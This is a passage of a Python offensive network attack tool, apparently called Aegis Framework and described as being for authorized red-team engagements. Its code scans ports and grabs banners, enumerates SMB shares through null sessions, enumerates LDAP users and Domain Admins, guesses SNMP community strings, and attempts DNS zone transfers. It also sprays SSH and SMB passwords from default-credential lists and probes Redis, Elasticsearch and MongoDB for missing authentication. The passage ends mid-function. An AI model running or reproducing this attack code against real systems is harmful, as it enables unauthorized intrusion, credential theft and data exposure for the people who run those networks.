#!/usr/bin/env python3
"""
Aegis Framework
==========================
Author      : arkanzasfeziii
License     : MIT
Version     : 1.0.0
Description : Offensive network attack framework for authorized red team engagements.
              Covers: active port scanning, service exploitation, credential attacks,
              SMB/LDAP/DNS/SNMP enumeration, lateral movement, C2 tunneling, IoT attacks.

              Aligned with MITRE ATT&CK:
                TA0007 Discovery | TA0008 Lateral Movement | TA0011 C2
                T1046 Network Scan | T1021 Remote Services | T1110 Brute Force

WARNING: For AUTHORIZED penetration testing and red team engagements ONLY.
Unauthorized use is ILLEGAL. Obtain written authorization before use.
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures
import ipaddress
import json
import os
import random
import re
import select
import socket
import struct
import subprocess
import sys
import textwrap
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, Generator, Iterator, List, Optional, Set, Tuple

try:
    import impacket
    from impacket import smb, nmb
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, samr, lsad
    IMPACKET = True
except ImportError:
    IMPACKET = False

try:
    import ldap3
    from ldap3 import Server as LDAPServer, Connection as LDAPConn, ALL, ANONYMOUS, SIMPLE
    LDAP3 = True
except ImportError:
    LDAP3 = False

try:
    import dns.resolver
    import dns.zone
    import dns.query
    import dns.name
    DNSPYTHON = True
except ImportError:
    DNSPYTHON = False

try:
    from pysnmp.hlapi import (getCmd, nextCmd, SnmpEngine, CommunityData,
                               UdpTransportTarget, ContextData, ObjectType, ObjectIdentity)
    PYSNMP = True
except ImportError:
    PYSNMP = False

try:
    import paho.mqtt.client as mqtt_client
    PAHO_MQTT = True
except ImportError:
    PAHO_MQTT = False

try:
    import requests as _req_lib
    REQUESTS = True
except ImportError:
    REQUESTS = False

try:
    import paramiko
    PARAMIKO = True
except ImportError:
    PARAMIKO = False

try:
    from rich.console import Console
    from rich.table import Table
    RICH = True
except ImportError:
    RICH = False

try:
    import pyfiglet
    PYFIGLET = True
except ImportError:
    PYFIGLET = False


# ── Constants ──────────────────────────────────────────────────────────────────

TOOL_NAME = "Aegis Framework"
VERSION   = "1.0.0"
AUTHOR    = "arkanzasfeziii"
COMMAND   = "aegis"

LEGAL_WARNING = """
╔══════════════════════════════════════════════════════════════════════════════╗
║         ⚠   NETREAPER — AUTHORIZED RED TEAM USE ONLY   ⚠                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This framework executes REAL network attacks: port scanning, SMB credential ║
║  capture, LDAP enumeration, protocol exploitation, lateral movement,         ║
║  password spraying, and C2 tunneling.                                        ║
║                                                                              ║
║  Requirements before use:                                                   ║
║    ✓ Written authorization from the target organization                     ║
║    ✓ Defined IP/subnet scope                                                ║
║    ✓ Rules of engagement signed off                                         ║
║                                                                              ║
║  The author (arkanzasfeziii) accepts NO LIABILITY for misuse.               ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 587,
    631, 993, 995, 1080, 1433, 1521, 1723, 2049, 2181, 3306, 3389, 3690,
    4444, 4848, 5432, 5900, 5985, 5986, 6379, 6443, 7001, 7077, 8080, 8443,
    8888, 9042, 9200, 9300, 9999, 10250, 11211, 27017, 27018, 50000,
]

PORT_SERVICES: Dict[int, str] = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPC", 135: "MS-RPC", 139: "NetBIOS",
    143: "IMAP", 443: "HTTPS", 445: "SMB", 587: "SMTP-TLS", 631: "IPP",
    993: "IMAPS", 995: "POP3S", 1080: "SOCKS5", 1433: "MSSQL", 1521: "Oracle",
    1723: "PPTP", 2049: "NFS", 2181: "ZooKeeper", 3306: "MySQL",
    3389: "RDP", 3690: "SVN", 4444: "Metasploit", 4848: "GlassFish",
    5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM-HTTP", 5986: "WinRM-HTTPS",
    6379: "Redis", 6443: "Kubernetes", 7001: "WebLogic", 7077: "Spark",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Jupyter", 9042: "Cassandra",
    9200: "Elasticsearch", 9300: "Elasticsearch-Cluster", 9999: "Icecast",
    10250: "kubelet", 11211: "Memcached", 27017: "MongoDB", 50000: "DB2",
}

BANNER_PROBES: Dict[str, bytes] = {
    "HTTP":  b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    "SMTP":  b"EHLO netreaper\r\n",
    "FTP":   b"",  # FTP sends banner on connect
    "SSH":   b"",  # SSH sends banner on connect
    "REDIS": b"*1\r\n$4\r\nINFO\r\n",
    "MYSQL": b"",  # MySQL sends banner on connect
}

SNMP_COMMUNITY_STRINGS = [
    "public", "private", "community", "manager", "admin", "monitor",
    "read", "write", "snmpd", "cisco", "SNMP", "default",
]

SNMP_OIDS = {
    "sysDescr":    "1.3.6.1.2.1.1.1.0",
    "sysName":     "1.3.6.1.2.1.1.5.0",
    "sysLocation": "1.3.6.1.2.1.1.6.0",
    "sysContact":  "1.3.6.1.2.1.1.4.0",
    "ifTable":     "1.3.6.1.2.1.2.2.1.2",
    "hrSWInstalled":"1.3.6.1.2.1.25.6.3.1.2",
}

DEFAULT_CREDS: List[Tuple[str, str]] = [
    ("admin",   "admin"),   ("admin",   "password"), ("admin",   ""),
    ("root",    "root"),    ("root",    "password"), ("root",    ""),
    ("user",    "user"),    ("guest",   "guest"),    ("admin",   "123456"),
    ("admin",   "admin123"),("admin",   "1234"),     ("test",    "test"),
    ("oracle",  "oracle"),  ("sa",      ""),          ("postgres","postgres"),
    ("mysql",   "mysql"),   ("redis",   ""),          ("mongo",   ""),
    ("ftp",     "ftp"),     ("anonymous",""),
]

SSH_USERNAMES = ["root","admin","ubuntu","ec2-user","centos","kali","pi","vagrant",
                 "oracle","postgres","mysql","jenkins","gitlab","git","deploy","backup"]
SSH_PASSWORDS = ["password","123456","root","admin","toor","pass","changeme","letmein",
                 "raspberry","vagrant","ubuntu","1234","admin123","Password1"]

WORDLIST_SUBDOMAINS = [
    "www", "mail", "ftp", "smtp", "pop", "imap", "vpn", "remote", "intranet",
    "internal", "dev", "staging", "test", "api", "admin", "portal", "webmail",
    "git", "gitlab", "jenkins", "jira", "confluence", "uat", "prod", "beta",
    "cdn", "static", "assets", "img", "images", "files", "docs", "wiki",
    "dashboard", "monitor", "log", "backup", "db", "database", "mysql", "redis",
]

IOT_DEFAULT_CREDS: Dict[str, List[Tuple[str, str]]] = {
    "HTTP":    [("admin","admin"),("admin","password"),("admin","1234"),
                ("admin",""),("root","root"),("user","user")],
    "MQTT":    [("",""),("admin","admin"),("mqtt","mqtt"),("guest","guest")],
    "Telnet":  [("admin","admin"),("root","root"),("root",""),("admin",""),
                ("user","user"),("guest","guest")],
    "Modbus":  [],  # No auth by design
    "FTP":     [("anonymous",""),("admin","admin"),("admin",""),("ftp","ftp")],
}

WEB_ADMIN_PATHS: List[str] = [
    "/", "/admin", "/admin.php", "/admin/", "/login", "/login.php",
    "/manager/html", "/phpmyadmin", "/wp-admin", "/xmlrpc.php",
    "/console", "/dashboard", "/setup", "/config",
    "/cgi-bin/luci", "/webman/index.cgi", "/ui/",  # router admin panels
]

DNS_QUERY_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME", "PTR"]

C2_DNS_CHUNK_SIZE = 20  # chars per DNS label


# ── Dataclasses ────────────────────────────────────────────────────────────────

@dataclass
class OpenPort:
    host:    str
    port:    int
    service: str
    banner:  str  = ""
    version: str  = ""

@dataclass
class AttackResult:
    module:  str
    action:  str
    status:  str  # SUCCESS / FAILED / PARTIAL / INFO
    host:    str  = ""
    port:    int  = 0
    data:    Any  = None
    severity:str  = "INFO"
    notes:   str  = ""

@dataclass
class Credential:
    service:  str
    host:     str
    port:     int
    username: str
    password: str
    hash_val: str  = ""
    notes:    str  = ""

@dataclass
class EngagementContext:
    targets:     List[str]
    ports:       List[int]
    threads:     int
    timeout:     float
    delay:       float
    stealth:     bool
    results:     List[AttackResult]  = field(default_factory=list)
    open_ports:  List[OpenPort]      = field(default_factory=list)
    credentials: List[Credential]    = field(default_factory=list)
    loot:        Dict[str, Any]      = field(default_factory=dict)


# ── Helpers ────────────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "INFO") -> None:
    colors = {"INFO":"\033[36m","OK":"\033[32m","WARN":"\033[33m",
              "ERR":"\033[31m","CRIT":"\033[35m","SUCCESS":"\033[32m"}
    reset = "\033[0m"
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"{colors.get(level,'')}{ts} [{level}] {msg}{reset}")

def _sleep(ctx: EngagementContext) -> None:
    if ctx.stealth and ctx.delay > 0:
        time.sleep(ctx.delay)

def _tcp_connect(host: str, port: int, timeout: float) -> Optional[socket.socket]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        return s
    except Exception:
        return None

def _grab_banner(host: str, port: int, timeout: float) -> str:
    try:
        s = _tcp_connect(host, port, timeout)
        if not s:
            return ""
        probe = BANNER_PROBES.get(PORT_SERVICES.get(port, ""), b"")
        if probe:
            s.sendall(probe)
        s.settimeout(2)
        data = b""
        try:
            while len(data) < 1024:
                chunk = s.recv(256)
                if not chunk:
                    break
                data += chunk
        except Exception:
            pass
        s.close()
        return data.decode("utf-8", errors="replace").strip()[:256]
    except Exception:
        return ""

def _expand_targets(targets: List[str]) -> List[str]:
    hosts: List[str] = []
    for t in targets:
        try:
            net = ipaddress.ip_network(t, strict=False)
            hosts.extend(str(h) for h in net.hosts())
        except ValueError:
            hosts.append(t)
    return hosts


# ── Module 1: Port Scanner ────────────────────────────────────────────────────

class ScanModule:
    """TCP port scanner with banner grabbing and service fingerprinting."""

    def run(self, ctx: EngagementContext) -> List[AttackResult]:
        results: List[AttackResult] = []
        all_hosts = _expand_targets(ctx.targets)
        _log(f"[Scan] Scanning {len(all_hosts)} host(s), {len(ctx.ports)} ports per host", "INFO")

        total_open = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=ctx.threads) as ex:
            futures = {}
            for host in all_hosts:
                for port in ctx.ports:
                    futures[ex.submit(self._probe, host, port, ctx)] = (host, port)
            for fut in concurrent.futures.as_completed(futures):
                result = fut.result()
                if result:
                    ctx.open_ports.append(result)
                    total_open += 1
                    _log(f"[Scan] OPEN  {result.host}:{result.port}/{result.service}"
                         + (f" | {result.banner[:60]}" if result.banner else ""), "OK")
                    results.append(AttackResult(
                        "scan", "open_port", "INFO",
                        host=result.host, port=result.port,
                        data={"service": result.service, "banner": result.banner},
                        notes=f"{result.host}:{result.port} ({result.service}) OPEN"
                    ))
                if ctx.stealth:
                    time.sleep(ctx.delay)

        _log(f"[Scan] Done. {total_open} open port(s) found.", "INFO")
        ctx.loot["scan"] = [{"host": p.host, "port": p.port, "service": p.service,
                              "banner": p.banner} for p in ctx.open_ports]
        return results

    def _probe(self, host: str, port: int, ctx: EngagementContext) -> Optional[OpenPort]:
        s = _tcp_connect(host, port, ctx.timeout)
        if not s:
            return None
        service = PORT_SERVICES.get(port, f"unknown/{port}")
        s.close()
        banner = _grab_banner(host, port, ctx.timeout)
        version = self._fingerprint_version(banner, service)
        return OpenPort(host=host, port=port, service=service, banner=banner, version=version)

    def _fingerprint_version(self, banner: str, service: str) -> str:
        patterns = {
            "SSH":   r"SSH-[\d.]+-([^\s]+)",
            "HTTP":  r"Server:\s*([^\r\n]+)",
            "FTP":   r"^([\w\s\.]+) FTP",
            "SMTP":  r"^220\s+([^\s]+)",
            "Redis": r"redis_version:([^\s]+)",
            "MySQL": r"^.{4}([\d.]+)-",
        }
        for svc, pat in patterns.items():
            if svc.lower() in service.lower():
                m = re.search(pat, banner, re.I)
                if m:
                    return m.group(1).strip()
        return ""


# ── Module 2: Enumeration ─────────────────────────────────────────────────────

class EnumModule:
    """SMB, LDAP, DNS, SNMP enumeration — extract users, shares, records."""

    def run(self, ctx: EngagementContext, domain: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        for op in ctx.open_ports:
            if op.port in (139, 445):
                results.extend(self._smb_enum(ctx, op, domain))
            elif op.port in (389, 636, 3268, 3269):
                results.extend(self._ldap_enum(ctx, op, domain))
            elif op.port == 161:
                results.extend(self._snmp_enum(ctx, op))
            elif op.port == 53:
                results.extend(self._dns_enum(ctx, op, domain))
        if not ctx.open_ports:
            # Run against specified targets directly
            for target in ctx.targets:
                results.extend(self._smb_enum_direct(ctx, target, domain))
        return results

    def _smb_enum(self, ctx: EngagementContext, op: OpenPort, domain: str) -> List[AttackResult]:
        if not IMPACKET:
            return [AttackResult("enum", "smb", "PARTIAL",
                                 host=op.host, port=op.port,
                                 notes="Install impacket for SMB enumeration")]
        return self._smb_enum_direct(ctx, op.host, domain, port=op.port)

    def _smb_enum_direct(self, ctx: EngagementContext, host: str,
                          domain: str, port: int = 445) -> List[AttackResult]:
        if not IMPACKET:
            # Fallback: raw NetBIOS name query
            try:
                nb = nmb.NetBIOS()
                names = nb.queryIPForName(host, timeout=ctx.timeout)
                return [AttackResult("enum", "smb_netbios", "INFO", host=host,
                                     data={"netbios_names": names},
                                     notes=f"NetBIOS names: {names}")]
            except Exception:
                return []

        results: List[AttackResult] = []
        try:
            conn = SMBConnection(host, host, sess_port=port,
                                 timeout=int(ctx.timeout))
            # Try null session / anonymous
            try:
                conn.login("", "", "")
                null_session = True
            except Exception:
                null_session = False

            if null_session:
                _log(f"[Enum/SMB] Null session allowed on {host}:{port}!", "CRIT")
                try:
                    shares = conn.listShares()
                    share_list = [{"name": s["shi1_netname"][:-1],
                                   "type": int(s["shi1_type"]),
                                   "remark": s["shi1_remark"]} for s in shares]
                    _log(f"[Enum/SMB] Shares: {[s['name'] for s in share_list]}", "OK")
                    # Try to list readable shares
                    readable = []
                    for share in share_list:
                        try:
                            files = conn.listPath(share["name"], "\\")
                            readable.append(share["name"])
                            # Hunt for sensitive files
                            for f in files:
                                fname = f.get_longname()
                                if any(kw in fname.lower() for kw in
                                       ["password","cred","secret","config","backup",".env"]):
                                    _log(f"[Enum/SMB] Sensitive file: \\\\{host}\\{share['name']}\\{fname}", "CRIT")
                        except Exception:
                            pass
                    ctx.loot.setdefault("smb", []).append({
                        "host": host, "null_session": True,
                        "shares": share_list, "readable": readable,
                    })
                    results.append(AttackResult(
                        "enum", "smb_null_session", "SUCCESS",
                        host=host, port=port, severity="CRITICAL",
                        data={"shares": share_list, "readable": readable},
                        notes=f"SMB null session on {host} — {len(readable)} readable shares",
                    ))
                except Exception as e:
                    results.append(AttackResult("enum", "smb_enum", "PARTIAL", host=host, notes=str(e)))

            # OS / SMB version detection
            try:
                server_info = {
                    "hostname": conn.getServerName(),
                    "domain":   conn.getServerDomain(),
                    "os":       conn.getServerOS(),
                    "signing":  conn.isSigningRequired(),
                }
                _log(f"[Enum/SMB] {host}: {server_info['os']} | Signing={server_info['signing']}", "INFO")
                if not server_info["signing"]:
                    results.append(AttackResult(
                        "enum", "smb_signing_disabled", "SUCCESS",
                        host=host, port=port, severity="HIGH",
                        data=server_info,
                        notes=f"SMB signing NOT required on {host} — relay attack possible",
                    ))
                else:
                    results.append(AttackResult(
                        "enum", "smb_info", "INFO", host=host, data=server_info,
                        notes=f"OS: {server_info['os']} | Domain: {server_info['domain']}",
                    ))
            except Exception:
                pass
            conn.close()
        except Exception as exc:
            results.append(AttackResult("enum", "smb_connect", "FAILED", host=host, notes=str(exc)))
        return results

    def _ldap_enum(self, ctx: EngagementContext, op: OpenPort, domain: str) -> List[AttackResult]:
        if not LDAP3:
            return [AttackResult("enum", "ldap", "PARTIAL", host=op.host,
                                 notes="Install ldap3 for LDAP enumeration")]
        results: List[AttackResult] = []
        use_ssl = op.port in (636, 3269)
        try:
            server = LDAPServer(op.host, port=op.port, use_ssl=use_ssl, get_info=ALL,
                                connect_timeout=ctx.timeout)
            # 1. Anonymous bind (info leak)
            conn = LDAPConn(server, authentication=ANONYMOUS)
            conn.bind()
            if server.info:
                naming_contexts = getattr(server.info, "naming_contexts", [])
                base_dn = str(naming_contexts[0]) if naming_contexts else ""
                domain_from_ldap = domain or (base_dn.replace(",", ".").replace("DC=", "").replace("dc=", ""))
                _log(f"[Enum/LDAP] Base DN: {base_dn} | Domain: {domain_from_ldap}", "INFO")

                # 2. Enumerate users (common attributes)
                user_filter = "(&(objectClass=user)(objectCategory=person))"
                conn.search(base_dn, user_filter,
                            attributes=["sAMAccountName","memberOf","userAccountControl",
                                        "lastLogon","description","mail","cn"])
                users = []
                for entry in conn.entries[:100]:
                    uac = getattr(entry, "userAccountControl", None)
                    disabled = bool(int(str(uac)) & 2) if uac and str(uac).isdigit() else False
                    users.append({
                        "username": str(getattr(entry, "sAMAccountName", "")),
                        "cn":       str(getattr(entry, "cn", "")),
                        "email":    str(getattr(entry, "mail", "")),
                        "disabled": disabled,
                        "desc":     str(getattr(entry, "description", ""))[:100],
                    })
                # Check descriptions for passwords (common misconfiguration)
                users_with_pass = [u for u in users if any(
                    kw in u["desc"].lower() for kw in ["pass","pwd","cred","temp","initial"]
                )]
                if users_with_pass:
                    _log(f"[Enum/LDAP] Passwords found in descriptions! {[u['username'] for u in users_with_pass]}", "CRIT")
                    for u in users_with_pass:
                        ctx.credentials.append(Credential(
                            service="ldap_description", host=op.host, port=op.port,
                            username=u["username"], password=u["desc"],
                            notes=f"Password in LDAP description field for {u['username']}"
                        ))

                # 3. Enumerate groups
                group_filter = "(objectClass=group)"
                conn.search(base_dn, group_filter, attributes=["cn","member","description"])
                groups = []
                for entry in conn.entries[:50]:
                    members = [str(m) for m in getattr(entry, "member", [])]
                    groups.append({"name": str(getattr(entry, "cn", "")),
                                   "member_count": len(members)})

                # 4. Find privileged users (Domain Admins)
                da_filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users," + base_dn + "))"
                conn.search(base_dn, da_filter, attributes=["sAMAccountName"])
                domain_admins = [str(e.sAMAccountName) for e in conn.entries]

                ctx.loot.setdefault("ldap", {})[op.host] = {
                    "base_dn": base_dn, "user_count": len(users),
                    "domain_admins": domain_admins, "users_with_passwords_in_desc": users_with_pass,
                    "users": users[:20], "groups": groups[:10],
                }
                results.append(AttackResult(
                    "enum", "ldap_anonymous", "SUCCESS",
                    host=op.host, port=op.port,
                    severity="HIGH" if users else "MEDIUM",
                    data={"users": len(users), "domain_admins": domain_admins,
                          "creds_in_desc": len(users_with_pass)},
                    notes=f"Anonymous LDAP bind: {len(users)} users, DAs: {domain_admins}",
                ))
            conn.unbind()
        except Exception as exc:
            results.append(AttackResult("enum", "ldap_connect", "FAILED",
                                        host=op.host, notes=str(exc)))
        return results

    def _snmp_enum(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not PYSNMP:
            return [AttackResult("enum", "snmp", "PARTIAL", host=op.host,
                                 notes="Install pysnmp for SNMP enumeration")]
        results: List[AttackResult] = []
        found_community = None

        for community in SNMP_COMMUNITY_STRINGS:
            try:
                error_indication, error_status, _, var_binds = next(
                    getCmd(SnmpEngine(),
                           CommunityData(community, mpModel=1),
                           UdpTransportTarget((op.host, 161), timeout=ctx.timeout, retries=1),
                           ContextData(),
                           ObjectType(ObjectIdentity("1.3.6.1.2.1.1.1.0")))
                )
                if not error_indication and not error_status:
                    found_community = community
                    sys_descr = str(var_binds[0][1])
                    _log(f"[Enum/SNMP] Community '{community}' works on {op.host}! SysDescr: {sys_descr[:80]}", "CRIT")
                    break
            except Exception:
                pass

        if found_community:
            snmp_data: Dict[str, Any] = {"community": found_community}
            for oid_name, oid_str in SNMP_OIDS.items():
                try:
                    for error_ind, error_stat, _, vb in nextCmd(
                        SnmpEngine(),
                        CommunityData(found_community, mpModel=1),
                        UdpTransportTarget((op.host, 161), timeout=ctx.timeout, retries=1),
                        ContextData(),
                        ObjectType(ObjectIdentity(oid_str)),
                        lexicographicMode=False,
                        maxRows=20,
                    ):
                        if error_ind or error_stat:
                            break
                        for v in vb:
                            snmp_data.setdefault(oid_name, []).append(str(v[1]))
                except Exception:
                    pass
            ctx.loot.setdefault("snmp", {})[op.host] = snmp_data
            results.append(AttackResult(
                "enum", "snmp_community", "SUCCESS",
                host=op.host, port=161, severity="HIGH",
                data=snmp_data,
                notes=f"SNMP community '{found_community}' found — full device info accessible",
            ))
        else:
            results.append(AttackResult("enum", "snmp_community", "FAILED",
                                        host=op.host, notes="No SNMP community string worked"))
        return results

    def _dns_enum(self, ctx: EngagementContext, op: OpenPort, domain: str) -> List[AttackResult]:
        if not DNSPYTHON or not domain:
            return [AttackResult("enum", "dns", "PARTIAL", host=op.host,
                                 notes=f"Provide --domain and install dnspython for DNS enumeration")]
        results: List[AttackResult] = []

        # 1. Zone transfer attempt
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(op.host, domain, timeout=ctx.timeout))
            records = []
            for name in zone:
                for rdataset in zone[name]:
                    records.append({"name": str(name), "type": rdataset.rdtype,
                                    "data": [str(r) for r in rdataset]})
            _log(f"[Enum/DNS] ZONE TRANSFER SUCCESS! {len(records)} records from {op.host}", "CRIT")
            ctx.loot.setdefault("dns", {})[op.host] = {"zone_transfer": records}
            results.append(AttackResult(
                "enum", "dns_zone_transfer", "SUCCESS",
                host=op.host, port=53, severity="CRITICAL",
                data={"record_count": len(records), "records": records[:20]},
                notes=f"Zone transfer from {op.host} for '{domain}' succeeded — {len(records)} records exposed",
            ))
        except Exception:
            results.append(AttackResult("enum", "dns_zone_transfer", "FAILED",
                                        host=op.host, notes="Zone transfer refused"))

        # 2. Subdomain brute-force
        found_subs: List[Dict[str, str]] = []
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [op.host]
        resolver.timeout = ctx.timeout
        for sub in WORDLIST_SUBDOMAINS:
            fqdn = f"{sub}.{domain}"
            for qtype in ("A", "CNAME"):
                try:
                    ans = resolver.resolve(fqdn, qtype)
                    ips = [str(r) for r in ans]
                    found_subs.append({"subdomain": fqdn, "type": qtype, "records": ips})
                    _log(f"[Enum/DNS] Found: {fqdn} → {ips}", "OK")
                    break
                except Exception:
                    pass
            _sleep(ctx)

        if found_subs:
            ctx.loot.setdefault("dns", {}).setdefault(op.host, {})["subdomains"] = found_subs
            results.append(AttackResult(
                "enum", "dns_subdomain_enum", "SUCCESS",
                host=op.host, severity="MEDIUM",
                data={"found": len(found_subs), "subdomains": found_subs},
                notes=f"Discovered {len(found_subs)} subdomains for {domain}",
            ))
        return results


# ── Module 3: Credential Attacks ──────────────────────────────────────────────

class CredAttackModule:
    """Password spraying, default credential testing, hash capture."""

    def run(self, ctx: EngagementContext, username_list: Optional[List[str]] = None,
            password_list: Optional[List[str]] = None,
            spray_password: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        for op in ctx.open_ports:
            if op.port == 22:
                results.extend(self._ssh_spray(ctx, op, username_list or SSH_USERNAMES,
                                               password_list or SSH_PASSWORDS[:5], spray_password))
            elif op.port in (139, 445):
                results.extend(self._smb_spray(ctx, op, username_list, password_list, spray_password))
            elif op.port == 21:
                results.extend(self._ftp_anon(ctx, op))
            elif op.port == 6379:
                results.extend(self._redis_unauth(ctx, op))
            elif op.port in (9200, 9300):
                results.extend(self._elasticsearch_unauth(ctx, op))
            elif op.port == 27017:
                results.extend(self._mongodb_unauth(ctx, op))
            elif op.port == 11211:
                results.extend(self._memcached_unauth(ctx, op))
            elif op.port in (80, 8080, 8443, 443):
                results.extend(self._http_default_creds(ctx, op))
        return results

    def _ssh_spray(self, ctx: EngagementContext, op: OpenPort,
                   usernames: List[str], passwords: List[str],
                   spray_pass: str) -> List[AttackResult]:
        if not PARAMIKO:
            return [AttackResult("cred", "ssh_spray", "PARTIAL", host=op.host, port=op.port,
                                 notes="Install paramiko for SSH attacks")]
        results: List[AttackResult] = []
        spray_list = [(u, spray_pass) for u in usernames] if spray_pass else \
                     [(u, p) for u in usernames for p in passwords]

        for username, password in spray_list[:30]:  # cap iterations
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(op.host, port=op.port, username=username, password=password,
                               timeout=ctx.timeout, banner_timeout=ctx.timeout, allow_agent=False)
                _log(f"[Cred/SSH] SUCCESS {op.host}:{op.port} {username}:{password}", "CRIT")
                cred = Credential("SSH", op.host, op.port, username, password,
                                  notes="SSH brute-force success")
                ctx.credentials.append(cred)
                results.append(AttackResult(
                    "cred", "ssh_login", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"username": username, "password": password},
                    notes=f"Valid SSH credentials: {username}:{password}",
                ))
                client.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as exc:
                if "too many" in str(exc).lower():
                    _log(f"[Cred/SSH] Rate limited on {op.host}", "WARN")
                    break
            _sleep(ctx)
        return results

    def _smb_spray(self, ctx: EngagementContext, op: OpenPort,
                   usernames: Optional[List[str]], passwords: Optional[List[str]],
                   spray_pass: str) -> List[AttackResult]:
        if not IMPACKET:
            return []
        results: List[AttackResult] = []
        unames = usernames or ["administrator","admin","guest","test","backup","service"]
        pwds   = [spray_pass] if spray_pass else (passwords or ["Password1","Welcome1","Spring2024!"])
        for u in unames:
            for p in pwds:
                try:
                    conn = SMBConnection(op.host, op.host, sess_port=op.port, timeout=int(ctx.timeout))
                    conn.login(u, p, "")
                    _log(f"[Cred/SMB] SUCCESS {op.host} {u}:{p}", "CRIT")
                    cred = Credential("SMB", op.host, op.port, u, p)
                    ctx.credentials.append(cred)
                    results.append(AttackResult(
                        "cred", "smb_login", "SUCCESS",
                        host=op.host, port=op.port, severity="CRITICAL",
                        data={"username": u, "password": p},
                        notes=f"SMB login success: {u}:{p}",
                    ))
                    conn.close()
                except Exception:
                    pass
                _sleep(ctx)
        return results

    def _ftp_anon(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        try:
            s = _tcp_connect(op.host, op.port, ctx.timeout)
            if not s:
                return results
            banner = s.recv(256).decode("utf-8", errors="replace")
            s.sendall(b"USER anonymous\r\n")
            r1 = s.recv(256).decode("utf-8", errors="replace")
            s.sendall(b"PASS anonymous@\r\n")
            r2 = s.recv(256).decode("utf-8", errors="replace")
            if "230" in r2 or "logged in" in r2.lower():
                _log(f"[Cred/FTP] Anonymous login on {op.host}:{op.port}!", "CRIT")
                s.sendall(b"PWD\r\n")
                pwd_r = s.recv(256).decode("utf-8", errors="replace")
                s.sendall(b"PASV\r\n")
                s.sendall(b"LIST\r\n")
                ctx.credentials.append(Credential("FTP", op.host, op.port, "anonymous", ""))
                results.append(AttackResult(
                    "cred", "ftp_anonymous", "SUCCESS",
                    host=op.host, port=op.port, severity="HIGH",
                    data={"banner": banner, "pwd": pwd_r},
                    notes=f"FTP anonymous login allowed on {op.host}:{op.port}",
                ))
            s.sendall(b"QUIT\r\n")
            s.close()
        except Exception as exc:
            results.append(AttackResult("cred", "ftp_anon", "FAILED",
                                        host=op.host, port=op.port, notes=str(exc)))
        return results

    def _redis_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results = []
        s = _tcp_connect(op.host, op.port, ctx.timeout)
        if not s:
            return results
        try:
            s.sendall(b"*1\r\n$4\r\nINFO\r\n")
            data = s.recv(4096).decode("utf-8", errors="replace")
            if "redis_version" in data:
                m = re.search(r"redis_version:([\d.]+)", data)
                ver = m.group(1) if m else "unknown"
                _log(f"[Cred/Redis] Unauthenticated Redis on {op.host}:{op.port} v{ver}!", "CRIT")
                # Try to dump keys
                s.sendall(b"*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
                keys_data = s.recv(4096).decode("utf-8", errors="replace")
                ctx.credentials.append(Credential("Redis", op.host, op.port, "", "",
                                                   notes=f"Unauthenticated Redis v{ver}"))
                results.append(AttackResult(
                    "cred", "redis_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"version": ver, "keys_response": keys_data[:200]},
                    notes=f"Redis {ver} exposed without auth. Run: redis-cli -h {op.host} keys '*'",
                ))
        except Exception:
            pass
        finally:
            s.close()
        return results

    def _elasticsearch_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not REQUESTS:
            return []
        results = []
        try:
            resp = _req_lib.get(f"http://{op.host}:{op.port}/",
                                timeout=ctx.timeout, verify=False)
            data = resp.json()
            if "version" in data:
                ver = data["version"].get("number", "?")
                _log(f"[Cred/ES] Unauthenticated Elasticsearch {ver} on {op.host}:{op.port}!", "CRIT")
                # Enumerate indices
                idx_resp = _req_lib.get(f"http://{op.host}:{op.port}/_cat/indices?v",
                                        timeout=ctx.timeout, verify=False)
                ctx.credentials.append(Credential("Elasticsearch", op.host, op.port, "", "",
                                                   notes=f"Unauthenticated ES v{ver}"))
                results.append(AttackResult(
                    "cred", "elasticsearch_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"version": ver, "indices": idx_resp.text[:400]},
                    notes=f"Elasticsearch {ver} exposed — all data accessible",
                ))
        except Exception:
            pass
        return results

    def _mongodb_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results = []
        # MongoDB wire protocol: isMaster command
        msg = (
            b"\x48\x00\x00\x00"  # length
            b"\x01\x00\x00\x00"  # requestId
            b"\x00\x00\x00\x00"  # responseTo
            b"\xd4\x07\x00\x00"  # opCode OP_QUERY
            b"\x00\x00\x00\x00"  # flags
            b"admin.$cmd\x00"     # collection
            b"\x00\x00\x00\x00"  # skip
            b"\x01\x00\x00\x00"  # return 1
            b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00"  # doc
        )
        s = _tcp_connect(op.host, op.port, ctx.timeout)
        if not s:
            return results
        try:
